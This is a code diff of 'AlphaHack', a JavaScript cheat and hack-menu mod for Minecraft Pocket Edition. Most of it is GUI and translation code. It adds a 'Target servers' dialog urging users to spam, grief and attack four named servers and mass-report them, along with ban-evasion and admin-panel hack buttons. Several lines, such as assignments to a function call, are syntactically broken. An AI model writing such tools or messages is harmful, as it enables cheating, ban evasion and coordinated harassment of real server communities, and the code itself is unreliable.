@@ -1,34 +1,60 @@
 var ModPE;
 //Ctx context
-
 var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
 
-//Getting MCPE language for translator by ArceusMatt.
+var GetLang = ModPE.getLanguage();
 
-var GetLang = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetLanguageName();
+//disabled in some servers
+//requested by the owners or devs of the server
+//i will not disable in just any server i most know the dev or owner
 
-//Spam disabled in c57788.leet.cc
+var GetAddress = Server.getAddress();
 
-var GetPort = Server.getPort();
-if(GetPort=="57788")sspam = false;
+var hugecraft1 = "Ran out of credits";
+var hugecraft2 = "5.189.178.106";
+var hugecraft3 = "Same ip as minersland";
+var minersland = "186.155.203.58";
+var masterminers = "51.254.207.118";
+var pigraid = "108.61.72.52";
+
+if(Server.getAddress() == "5.189.178.106"){
+	tspam = false;
+	sspam = false;
+	tspam = null;
+	sspam = null;
+}
+if(Server.getAddress() == "51.254.207.118"){
+	GUI.dismiss();
+	showMenuBtn() = null;
+}
+if(Server.getAddress() == "108.61.72.52"){
+	GUI.dismiss();
+	showMenuBtn() = null;
+}
+if(Server.getAddress() == masterminers){
+	GUI.dismiss();
+	showMenuBtn() = null;
+}
+if(Server.getAddress() == pigraid){
+	GUI.dismiss();
+	showMenuBtn() = null;
+}
 
 /***********************/
 
 /*
 *   Authors: Arceus_matt, godsoft029, applqpak.
 *
-*    Started: MCPE v0.12.0
+*    Started MCPE v0.12.0
 *
-*    Open src?: Do not copy! ask permission.
+*    Do not copy! ask permission.
 *
-*    contact me at: @ArceusMatt
+*    contact @ArceusMatt
 *
 *    Always get my revenge. =) enjoy!
 */
 
 /***********************/
-
-//Shorter android widget understanding.
 
 var Button = android.widget.Button;
 var LinearLayout = android.widget.LinearLayout;
@@ -54,7 +80,7 @@ var menu;
 //AlphaHack variables
 
 var num0  = 0;
-var version = "0.7.4";
+var version = "bt6";
 var name = "AlphαHαck";
 var authers = "ArceusMatt";
 var authers2 = "Godsoft029";
@@ -64,12 +90,11 @@ var text = "AlphaHack!";
 var space = " ";
 var client = "§f<§3AlphαHαck§f> ";
 var hackcount = 0;
-var fps = 0;
-var lastLoop = new Date;
 var modpeFolder = ctx.getDir("ModPE", 0);
 var modpeFile = new java.io.File(modpeFolder, "AlphaHack.js");
 var operm = "pocketmine.command";
 var operm2 = "*";
+var bows = 10;
 
 var sspam = false;
 var hackk = false;
@@ -103,6 +128,15 @@ var deadchat = false;
 var nofly = false;
 var autod = false;
 var tspam = false;
+var remode = false;
+var onlynight = false;
+var somd = false;
+var desktop = false;
+var block = false;
+var killdaura = false;
+var ttot = false;
+var ban = false;
+var tapdd = false;
 
 //ParticleType.angryVillager;
 var particle1 = false;
@@ -162,8 +196,20 @@ var particle27 = false;
 var particle28 = false;
 //ParticleType.waterWake;
 var particle29 = false;
+//largeexplode
+var particle30 = false;
+//spell2
+var particle31 = false;
+//spell3
+var particle32 = false;
 
-var GUIColor = Color.BLACK
+var color1 = false;
+var color2 = false;
+var color3 = false;
+var color4 = false;
+var color5 = false;
+
+var GUIColor = Color.TRANSPARENT;
 
 var GUIColor1 = Color.TRANSPARENT;
 var GUIColor2 = Color.BLACK;
@@ -199,80 +245,51 @@ var GUIBtns12 = Color.MAGENTA;
 var GUISize = 3;
 
 var vid = 11;
-var vidd = false
+var vidd = false;
+var viddd = "§3";
+var tbox = false;
 
 /***********************/
 
-ModPE.langEdit("menu.copyright","Mojang & Arceus_matt's AlphaHack!");
-ModPE.langEdit("menu.play","§3Play");
-ModPE.langEdit("menu.options","§3Settings");
-ModPE.langEdit("menu.skins","§3Skins");
-/*ModPE.langEdit("playscreen.header.local","§3Select world");
-ModPE.langEdit("skins.title","§3Skins");
-ModPE.langEdit("options.title","§3Settings");*/
+ModPE.langEdit("menu.copyright","@Mojang, Arceus_Matt's AlphaHack");
+
 ModPE.langEdit("deathScreen.message","§c§lWasted");
-ModPE.langEdit("playscreen.new","§3New");
-ModPE.langEdit("playscreen.quit","§3Back");
-ModPE.langEdit("skins.restore.button","§3Restore");
-ModPE.langEdit("createWorldScreen.advanced","§3Advanced");
-ModPE.langEdit("externalServerScreen.addServer","§3Add Server");
-ModPE.langEdit("multiplayer.player.joined","§3%s joined the game");
-ModPE.langEdit("multiplayer.player.left","§3%s left the game");
-ModPE.langEdit("deathScreen.quit","§3Main Menu");
-ModPE.langEdit("deathScreen.respawn","§3Respawn");
-ModPE.langEdit("pauseScreen.quit","§3Main Menu");
-ModPE.langEdit("pauseScreen.options","§3Settings");
-ModPE.langEdit("pauseScreen.back","§3Back to game");
-ModPE.langEdit("menu.returnToGame","§3Back to game");
-ModPE.langEdit("death.attack.mob","§3%1$s was slain by %2$s");
-ModPE.langEdit("death.attack.fall","§3%1$s hit the ground too hard");
-ModPE.langEdit("death.attack.explosion","§3%1$s blew up");
-ModPE.langEdit("death.attack.arrow","§3%1$s was shot by %2$s");
-ModPE.langEdit("death.attack.drown","§3%1$s drowned");
-ModPE.langEdit("death.fell.accident.generic","§3%1$s fell from a high place");
-ModPE.langEdit("death.attack.outOfWorld","§3%1$s fell out of the world");
-ModPE.langEdit("death.attack.onFire","§3%1$s burned to death");
-ModPE.langEdit("death.attack.magic","§3%1$s was killed by magic");
-ModPE.langEdit("death.attack.inWall","§3%1$s suffocated in a wall");
-ModPE.langEdit("death.attack.lava","§3%1$s tried to swim in lava");
-ModPE.langEdit("death.attack.inFire","§3%1$s went up in flames");
-ModPE.langEdit("death.attack.cactus","§3%1$s was pricked to death");
-ModPE.langEdit("commands.op.success","§lOpped %s");
-ModPE.langEdit("commands.banip.success","§rBanned IP address §l%s");
-ModPE.langEdit("commands.banip.success.players","§rBanned IP address §l%s §rbelonging to %s");
-ModPE.langEdit("chatScreen.hide","§3Hide");
-ModPE.langEdit("menu.returnToGame","§3Back to Game")
-ModPE.langEdit("menu.playOnRealms","§3Play on Realms");
-ModPE.langEdit("menu.multiplayer","§3Multiplayer")
-ModPE.langEdit("menu.online","§3Minecraft Realms");
-ModPE.langEdit("menu.achievements","§3Achievements");
-/*container.stonecutter=Stonecutter
-container.enderchest=Ender Chest
-container.furnace=Furnace
-container.hopper=Item Hopper
-container.inventory=Inventory
-container.beacon=Beacon
-container.brewing=Brewing Stand
-container.chest=Chest
-container.chestDouble=Large Chest
-container.crafting=Crafting
-container.creative=Item Selection
-container.dispenser=Dispenser
-container.dropper=Dropper
-container.enchant=Enchant
-cauldronScreen.header=Cauldron
-chestScreen.header.large=Large Chest
-chestScreen.header.player=Inventory
-chestScreen.header.small=Chest*/
-ModPE.langEdit("action.interact.createMap","§3Create Map");
-ModPE.langEdit("createWorldScreen.action.editLocal","§3Make Infinite!");
-ModPE.langEdit("createWorldScreen.action.local","§3Create World!");
-ModPE.langEdit("createWorldScreen.alwaysDay","§3Always Day");
-ModPE.langEdit("createWorldScreen.delete","Delete");
-ModPE.langEdit("createWorldScreen.game.settings","§3Game Settings");
-ModPE.langEdit("createWorldScreen.gameMode.creative","§3Creative");
-ModPE.langEdit("createWorldScreen.gameMode.survival","§3Survival");
-/*ModPE.langEdit("createWorldScreen.header.local","§3Create a World");*/
+ModPE.langEdit("death.attack.mob",ModPE.getI18n("death.attack.mob"));
+ModPE.langEdit("commands.op.success","§l" + ModPE.getI18n("commands.op.success"));
+ModPE.langEdit("commands.banip.success","§l" + ModPE.getI18n("commands.banip.success"));
+ModPE.langEdit("commands.banip.success.players","§l" + ModPE.getI18n("commands.banip.success.players"));
+
+ModPE.langEdit("menu.play",viddd + ModPE.getI18n("menu.play"));
+ModPE.langEdit("menu.options",viddd + ModPE.getI18n("menu.options"));
+ModPE.langEdit("menu.skins",viddd + ModPE.getI18n("menu.skins"));
+ModPE.langEdit("menu.realms",viddd + ModPE.getI18n("menu.realms"));
+ModPE.langEdit("skins.restore.button",viddd + ModPE.getI18n("skins.restore.button"));
+ModPE.langEdit("playscreen.new",viddd + ModPE.getI18n("playscreen.new"));
+ModPE.langEdit("createWorldScreen.advanced",viddd + ModPE.getI18n("createWorldScreen.advanced"));
+ModPE.langEdit("externalServerScreen.addServer",viddd + ModPE.getI18n("externalServerScreen.addServer"));
+ModPE.langEdit("deathScreen.message",viddd + ModPE.getI18n("deathScreen.message"));
+ModPE.langEdit("playscreen.quit",viddd + ModPE.getI18n("playscreen.quit"));
+ModPE.langEdit("deathScreen.quit",viddd + ModPE.getI18n("deathScreen.quit"));
+ModPE.langEdit("deathScreen.respawn",viddd + ModPE.getI18n("deathScreen.respawn"));
+ModPE.langEdit("pauseScreen.quit",viddd + ModPE.getI18n("pauseScreen.quit"));
+ModPE.langEdit("pauseScreen.options",viddd + ModPE.getI18n("pauseScreen.options"));
+ModPE.langEdit("pauseScreen.back",viddd + ModPE.getI18n("pauseScreen.back"));
+ModPE.langEdit("menu.returnToGame",viddd + ModPE.getI18n("menu.returnToGame"));
+ModPE.langEdit("chatScreen.hide",viddd + ModPE.getI18n("chatScreen.hide"));
+ModPE.langEdit("menu.playOnRealms",viddd + ModPE.getI18n("menu.playOnRealms"));
+ModPE.langEdit("menu.multiplayer",viddd + ModPE.getI18n("menu.multiplayer"));
+ModPE.langEdit("menu.online",viddd + ModPE.getI18n("menu.online"));
+ModPE.langEdit("menu.achievements",viddd + ModPE.getI18n("menu.achievements"));
+ModPE.langEdit("action.interact.createMap",viddd + ModPE.getI18n("action.interact.createMap"));
+ModPE.langEdit("createWorldScreen.action.editLocal",viddd + ModPE.getI18n("createWorldScreen.action.editLocal"));
+ModPE.langEdit("createWorldScreen.action.local",viddd + ModPE.getI18n("createWorldScreen.action.local"));
+ModPE.langEdit("createWorldScreen.alwaysDay",viddd + ModPE.getI18n("createWorldScreen.alwaysDay"));
+ModPE.langEdit("createWorldScreen.delete",ModPE.getI18n("createWorldScreen.delete"));
+ModPE.langEdit("createWorldScreen.game.settings",viddd + ModPE.getI18n("createWorldScreen.game.settings"));
+ModPE.langEdit("createWorldScreen.gameMode.creative",viddd + ModPE.getI18n("createWorldScreen.gameMode.creative"));
+ModPE.langEdit("createWorldScreen.gameMode.survival",viddd + ModPE.getI18n("createWorldScreen.gameMode.survival"));
+
+
 
 /***********************/
 
@@ -309,7 +326,9 @@ function dip2px(dips){
 }
 
 function newLevel(){ 
-clientMessage(client + "§7Check out our server §ec57788.leet.cc 57788" + "\n" + "§aKik§f: ArceusMatt" + "\n" + "§bTwitter§f: @ArceusMatt" + "\n" + "§cGoogle+§f: Arceus matt");
+clientMessage("§2≡≡=======»§a>§9 α §a<§2«======≡≡§f§r");
+clientMessage(client + "§7Server §emc31069.imagical.host - 31069" + "\n" + "§aKik§f: ArceusMatt" + "\n" + "§bTwitter§f: @ArceusMatt" + "\n" + "§cGoogle+§f: Arceus matt" + "\n" + "§fYou§4tube§f: Arceus Matt");
+clientMessage("§2≡≡=======»§a>§9 α §a<§2«======≡≡§f§r");
 }
 
 /***********************/
@@ -366,7 +385,7 @@ function updateVersion() {
     try {
         var upd = new android.app.AlertDialog.Builder(ctx);
         upd.setTitle("New update is here!");
-        upd.setMessage("This means new stuff is added and more bug fixes!\n\nAlphaHack is ready to update, press update to get new features.\n\nCurrent version: " + version);
+        upd.setMessage("This means new stuff is added and more bug fixes!\n\nAlphaHack is ready to update, press update to get new features.\n\nCurrent version: " + version + " New version: " + newUpdate + "\nHow to download: delete old AlphaHack and then open browser with link given then enable new AlphaHack");
         upd.setNegativeButton("Download later", new android.content.DialogInterface.OnClickListener() {
             onClick: function(par1) {
             dialog.dismiss(); 
@@ -374,9 +393,11 @@ function updateVersion() {
         });
         upd.setPositiveButton("Download update", new android.content.DialogInterface.OnClickListener() {
             onClick: function(par1) {
-  var urls = new Intent(ctx);                  urls.setAction(Intent.ACTION_VIEW);
-                    urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=1"));
+				var urls = new Intent(ctx);
+				urls.setAction(Intent.ACTION_VIEW);
+                    urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=0"));
                     ctx.startActivity(urls);
+					Toast.makeText(ctx, "Please press direct download!", 1).show();
             }
         });
         var dialog = upd.create();
@@ -386,12 +407,6 @@ function updateVersion() {
         print("Error: " + err);
     }
 }
-
-/*function updateVersion() {
-                var urls = new Intent(ctx);                  urls.setAction(Intent.ACTION_VIEW);
-                    urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=1"));
-                    ctx.startActivity(urls);
-            }*/
 
 /***********************/
 
@@ -411,13 +426,13 @@ ctx.runOnUiThread(new Runnable({ run: function(){
         layout.setOrientation(1);
         var menuNo = new Button(ctx);
 menuNo.setTextSize(1);
-        menuNo.setText("");
+        menuNo.setText("Online server");
         layout.addView(menuNo);
  
-        NO1 = new PopupWindow(layout, dip2px(5), dip2px(5)); 
+        Debug = new PopupWindow(layout, dip2px(1), dip2px(1)); 
 
-        NO1.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
-        NO1.showAtLocation(ctx.getWindow().getDecorView(), Gravity.RIGHT | Gravity.TOP, 0, 0);
+        Debug.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        Debug.showAtLocation(ctx.getWindow().getDecorView(), Gravity.RIGHT | Gravity.BOTTOM, 0, 0);
         }catch(err){
             Toast.makeText(ctx, "An error occured: " + err, 1).show();
         }
@@ -485,15 +500,175 @@ var exitb = new Button(ctx);
 exitb.setTextColor(Color.RED);
             exitb.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){
-
-                    menu.dismiss(); 
-
-print("Closed successfully");
-
-showMenuBtn();
+menu.dismiss(); 
+showMenuBtn(); 
+Toast.makeText(ctx, "Closed successfully", 1).show();
                 }
             }));
             menuLayout.addView(exitb);
+			
+			var exitc = new Button(ctx);
+            exitc.setText("Complete exit");
+            exitc.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){
+menu.dismiss(); 
+                }
+            }));
+            menuLayout.addView(exitc);
+			
+			var news = new TextView(ctx);
+            news.setTextSize(15);
+            news.setText("News");
+            news.setTextColor(Color.WHITE);
+            news.setGravity(Gravity.CENTER);
+            menuLayout.addView(news);
+			
+	 var mn1 = new android.widget.Button(ctx);
+		mn1.setText("New server!");
+		mn1.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+var alert = new android.app.AlertDialog.Builder(ctx); 
+
+var scroll = new android.widget.ScrollView(ctx); 
+var layout = new android.widget.LinearLayout(ctx); 
+layout.setOrientation(1);
+
+alert.setTitle("Coming soon");
+alert.setMessage("We have a new server!!!" + "\n" + "IP: mc31069.imagical.host PORT: 31069" + "\n" + "Come join us and have some fun! at HugecraftPE.");
+
+alert.setPositiveButton("Exit mod", new android.content.DialogInterface.OnClickListener(){ 
+  onClick: function(viewarg){
+    
+dialog.dismiss();
+menu.dismiss();
+showMenuBtn();
+      }});
+
+alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
+   onClick: function(viewarg){
+ 
+dialog.dismiss();
+      }});
+var dialog = alert.create();
+dialog.show();
+			}
+		});
+		menuLayout.addView(mn1)
+		
+		var mn2 = new android.widget.Button(ctx);
+		mn2.setText("Target servers");
+		mn2.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+var alert = new android.app.AlertDialog.Builder(ctx); 
+
+var scroll = new android.widget.ScrollView(ctx); 
+var layout = new android.widget.LinearLayout(ctx); 
+layout.setOrientation(1);
+
+alert.setTitle("Destory server");
+alert.setMessage("Spam and grief and attack these servers:\na32670.leet.cc : 32670\nfor rude staff.\na14762.leet.cc : 14762\nFor not opping their donators\n23.91.4.66 : 44810\nFor rude staff\nplayschool.leet.cc : 15101\nFor talkin about me without meeting me\nAs in attacking do whatever you want =) just mess the servers up, enjoy!\nYou could also go to minecraftpocket-servers.com &\nReport their servers so they lose players.");
+
+alert.setPositiveButton("Exit mod", new android.content.DialogInterface.OnClickListener(){ 
+  onClick: function(viewarg){
+    
+dialog.dismiss();
+menu.dismiss();
+      }});
+
+alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
+   onClick: function(viewarg){
+ 
+dialog.dismiss();
+      }});
+var dialog = alert.create();
+dialog.show();
+			}
+		});
+		menuLayout.addView(mn2)
+		
+		/*var mn3 = new android.widget.Button(ctx);
+		mn3.setText("New server host");
+		mn3.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+var alert = new android.app.AlertDialog.Builder(ctx); 
+
+var scroll = new android.widget.ScrollView(ctx); 
+var layout = new android.widget.LinearLayout(ctx); 
+layout.setOrientation(1);
+
+alert.setTitle("Coming soon");
+//alert.setMessage("There's a new cheap host!\nBlah Blah can now host your own MCPE server\nFor just 8.99 USD per month for the following:\n8 Player slots & blah plugins, No lag, no borders, no catches\nJust go to: blah blah\nTo buy your own server today!");
+
+alert.setPositiveButton("Exit mod", new android.content.DialogInterface.OnClickListener(){ 
+  onClick: function(viewarg){
+    
+dialog.dismiss();
+menu.dismiss();
+      }});
+
+alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
+   onClick: function(viewarg){
+ 
+dialog.dismiss();
+      }});
+var dialog = alert.create();
+dialog.show();
+			}
+		});
+		menuLayout.addView(mn3);*/
+		
+		var alpha = new TextView(ctx);
+            alpha.setTextSize(15);
+            alpha.setText("AlphaHackPE");
+			alpha.setTextColor(Color.WHITE);
+            alpha.setGravity(Gravity.CENTER);
+			alpha.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+kik(); 
+			}
+		});
+            menuLayout.addView(alpha);
+			
+	  function kik()
+      {
+      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
+      var webs = new android.webkit.WebView(ctx);
+      var webset = webs.getSettings();
+      webset.setJavaScriptEnabled(true);
+      webs.setWebChromeClient(new android.webkit.WebChromeClient());
+      webs.setWebViewClient(new android.webkit.WebViewClient());
+      webs.loadUrl('http://kik.me/ArceusMatt');
+//Site URL
+      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
+      }}));
+      }
+			
+/*	var toolbox = new android.widget.LinearLayout(ctx);
+	 toolbox.setOrientation(0);
+
+var btnTool = new android.widget.Button(ctx);
+
+           btnTool.setText("Toolbox fixes: "+(tbox?"on":"off"));
+            btnTool.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+tbox?tbox=false:tbox=true;
+btnTool.setText("Toolbox fixes: "+(tbox?"on":"off"));
+if(tbox == true){
+
+chat = chat2;
+tbox = true
+}
+if(tbox == false){
+
+chat2 = chat;
+tbox = false
+                }
+}
+            }));
+     
+     toolbox.addView(btnTool);
+
+menuLayout.addView(toolbox);*/
 
 var btn1 = new android.widget.Button(ctx);
 		btn1.setText("Settings");
@@ -501,6 +676,12 @@ if(GetLang=="de_DE")btn1.setText("Einstellungen");
 if(GetLang=="ko_KR")btn1.setText('설정');
 
 if(GetLang=="es_MX")btn1.setText('Configuración');
+
+if(GetLang=="ja_JP")btn1.setText('設定');
+
+if(GetLang=="fr_FR")btn1.setText('Paramètres');
+
+if(GetLang=="it_IT")btn1.setText('Impostazioni');
 btn1.setTextColor(GUIBtns);
 		btn1.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -539,13 +720,13 @@ var credit2 = new android.widget.TextView(ctx); credit2.setGravity(android.view.
 		lmenuLayout.addView(credit2);
             
             var title = new android.widget.TextView(ctx); title.setGravity(android.view.Gravity.CENTER);
-		title.setText("Major help by:");
+		title.setText("Help by:");
        title.setTextColor(GUIName);
 		title.setTextSize(20);
 		lmenuLayout.addView(title);
-
+		
  var credit1 = new android.widget.TextView(ctx); credit1.setGravity(android.view.Gravity.CENTER);
-	 credit1.setText("Godsoft029!");
+	 credit1.setText("Godsoft029, applqpak!");
        credit1.setTextColor(GUIName);
 		credit1.setTextSize(20);
 		lmenuLayout.addView(credit1);
@@ -584,7 +765,7 @@ var ab = new android.widget.Button(ctx);
 		ab.setText("About mod");
 		ab.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
-var alert = new android.app.AlertDialog.Builder(ctx); 
+var alert = new android.app.AlertDialog.Builder(ctx); +
 alert.setTitle("About Alphα Hαck"); 
 
 var scroll = new android.widget.ScrollView(ctx); 
@@ -592,13 +773,14 @@ var layout = new android.widget.LinearLayout(ctx);
 layout.setOrientation(1);
 
 alert.setTitle("About Alphα Hαck");
- alert.setMessage("Alpha Hack was originally inspired by many other mods in mcpe 0.12\nMods inspiration: GhostHack.js, ServiceHack.js, TooManyItems.js.\nPeople wanted me to bring it back so i did\nAlpha hack today is much more powerful\nI hope you enjoy all its features like i do\nThanks for downloading\nSpecial thanks to: godsoft029 for some script\nThanks to: ALLMCPE for telling me to make this mod again.\n\nHow to use it: Simply open a menu and click a button then you will begin to use its features!\n\nYou can change GUI color in settings\nIf anything goes wrong click restart script in settings\n\nUSE HACK MENU AT YOUR OWN RISK.\nPlease do not copy this mod or steal script.\n\nGerman translation: Godsoft029,\nKorean translation: johnmacrocraft,\nSpanish translation: walpo\nJapanese translation: Not done yet");
+ alert.setMessage("Alpha Hack was originally inspired by many other mods in mcpe 0.12\nMods inspiration: GhostHack.js, ServiceHack.js, TooManyItems.js.\nPeople wanted me to bring it back so i did\nAlpha hack today is much more powerful\nI hope you enjoy all its features like i do\nThanks for downloading\nSpecial thanks to: godsoft029 for some script\nThanks to: ALLMCPE for telling me to make this mod again.\n\nHow to use it: Simply open a menu and click a button then you will begin to use its features!\n\nYou can change GUI color in settings\nIf anything goes wrong click restart script in settings\n\nUSE HACK MENU AT YOUR OWN RISK.\nPlease do not copy this mod or steal script.\n\nGerman translation: Godsoft029,\nKorean translation: johnmacrocraft,\nSpanish translation: walpo\nJapanese translation: Takutaku 716\nFrench translation: paetti");
 
 alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
   onClick: function(viewarg){
     
 dialog.dismiss();
 lmenu.dismiss();
+showMenuBtn();
       }});
 
 alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
@@ -624,13 +806,14 @@ var layout = new android.widget.LinearLayout(ctx);
 layout.setOrientation(1);
 
 alert.setTitle("Alphα Hαck" + space + version + space + "changelog");
- alert.setMessage(version + space + "Changelog:" + "\nAdded particle menu, added tutorials for bans, added more modpe stuff, fixed settings.");
+alert.setMessage(version + space + "Changelog:" + "\nNew color border, added more modpe and hack features, check full changelog in g+ group, bug fixes.");
 
 alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
   onClick: function(viewarg){
     
 dialog.dismiss();
 lmenu.dismiss();
+showMenuBtn();
       }});
 
 alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
@@ -648,8 +831,9 @@ var dl = new android.widget.Button(ctx);
 		dl.setText("Download link");
 		dl.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){ 
-var urls = new Intent(ctx);                  urls.setAction(Intent.ACTION_VIEW);
-                    urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=1"));
+var urls = new Intent(ctx);
+urls.setAction(Intent.ACTION_VIEW);
+                    urls.setData(Uri.parse("https://www.dropbox.com/s/k29sz9u27sgqnjr/ALPHAHack.js?dl=0"));
                     ctx.startActivity(urls);
 			}
 		});
@@ -660,10 +844,32 @@ var cc = new android.widget.Button(ctx);
 		cc.setText("Contact Creator");
 		cc.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){ 
-clientMessage(client + "\n" + "§aKik§f: ArceusMatt" + "." + "\n" + "§bTwitter§f: @ArceusMatt"  + "." + "\n" + "§cGoogle+§f: Arceus Matt" + ".")
+clientMessage(client + "\n" + "§aKik§f: ArceusMatt" + "." + "\n" + "§bTwitter§f: @ArceusMatt"  + "." + "\n" + "§cGoogle+§f: Arceus Matt" + "\n" + "§fYou§4tube§f: Arceus Matt" + ".");
 			}
 		});
 		lmenuLayout.addView(cc);
+
+var desk = new android.widget.Button(ctx);
+           desk.setText("Desktop mode: "+(desktop?"on":"off"));
+            desk.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+desktop?desktop=false:desktop=true;
+desk.setText("Desktop mode: "+(desktop?"on":"off"));
+if(desktop == true){
+clientMessage(client + "§7Desktop UI on");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeModPESetDesktopGui(true);
+
+desktop = true
+}
+if(desktop == false){
+clientMessage(client + "§7Desktop UI off");
+net.zhuoweizhang.mcpelauncher.ScriptManager.nativeModPESetDesktopGui(false);
+
+desktop = false
+                }
+}
+            }));
+            lmenuLayout.addView(desk);
 
 var g1 = new Button(ctx);
             g1.setText("Menu Center");       
@@ -733,6 +939,104 @@ GUISize = 1;
                 }
             }));
             lmenuLayout.addView(gs3);
+			
+			var mct = new Button(ctx);
+            mct.setText("MC Text color");       
+            mct.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+new5();
+                }
+            }));
+            lmenuLayout.addView(mct);
+			
+					function new5() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+fov = new android.widget.PopupWindow();
+var Layer = new android.widget.LinearLayout(ctx);
+var select1 = new android.widget.Button(ctx);
+var select2 = new android.widget.Button(ctx);
+var select3 = new android.widget.Button(ctx);
+var select4 = new android.widget.Button(ctx);
+var select5 = new android.widget.Button(ctx);
+var Dialog = new android.app.Dialog(ctx);
+ 
+Dialog.setTitle("Select");
+Dialog.setContentView(Layer);
+ 
+Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+ 
+Layer.addView(select1);
+Layer.addView(select2);
+Layer.addView(select3);
+Layer.addView(select4);
+Layer.addView(select5);
+//Layer.addView(Exit);
+ 
+            select1.setText("Blue");
+            select1.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+ viddd = "§3";
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+             
+            select2.setText("Red");
+            select2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+viddd = "§c";
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+			
+			select3.setText("Green");
+            select3.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+viddd = "§a";
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+			
+			select4.setText("Yellow");
+            select4.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+viddd = "§e";
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+			
+			select5.setText("Pink/Purple");
+            select5.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+viddd = "§d";
+Dialog.dismiss();
+showMenuBtn();
+                }
+            }));
+//Exit.setText("done");
+ 
+/*Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ 
+Dialog.dismiss();
+showMenuBtn();
+}
+});*/
+ 
+new1.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+new1.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+new1.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The new Dialog Is Malfunctioning:"+e);
+}
+}});
+}
 
             var l1 = new Button(ctx);
             l1.setText("Transparent Menu");       
@@ -740,6 +1044,7 @@ GUISize = 1;
                 onClick: function(viewarg){         
 GUIColor = GUIColor1
 var GUIName = Color.WHITE;
+settings1();
                 }
             }));
             lmenuLayout.addView(l1);
@@ -961,6 +1266,11 @@ showMenuBtn();
 
             lmenu = new PopupWindow(lmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             lmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+			var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+lmenuLayout1.setBackgroundDrawable(bg);
+lmenuLayout1.setPadding(20,0,20,0);
             lmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -976,6 +1286,10 @@ if(GetLang=="de_DE")btn2.setText('Hack Menü');
 if(GetLang=="ko_KR")btn2.setText('해킹 메뉴');
 
 if(GetLang=="es_MX")btn2.setText('Menú de hacks');
+
+if(GetLang=="ja_JP")btn2.setText('ハックメニュー');
+
+if(GetLang=="it_IT")btn2.setText('Menu Hack');
 btn2.setTextColor(GUIBtns);
 		btn2.setOnClickListener(new android.view.View.OnClickListener() {
 			onClick: function(v){
@@ -1031,22 +1345,156 @@ var ddp = new android.widget.Button(ctx);
             ddp.setText("CID/Devban pardon");
             ddp.setOnClickListener(new android.view.View.OnClickListener({
                 onClick: function(viewarg){
-devpardon();
-
-print("You should be dev pardon now, if not restart MCPE");
+					
+					devpardon(); 
+					
                 }
             }));
             cmenuLayout.addView(ddp);
 
-/*var s = new android.widget.Button(ctx);
-            s.setText("Change oplist test");
-            s.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
+var leet4 = new android.widget.Button(ctx);
+            leet4.setText("LEET.cc admin panel");
+            leet4.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
 cmenu.dismiss();
-somethingomgyay(); 
+leetMenu();
+                }
+            }));
+            cmenuLayout.addView(leet4);
+
+function leetMenu() {
+ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
+        try{
+            var hmenuLayout = new android.widget.LinearLayout(ctx);
+            var hmenuScroll = new android.widget.ScrollView(ctx);
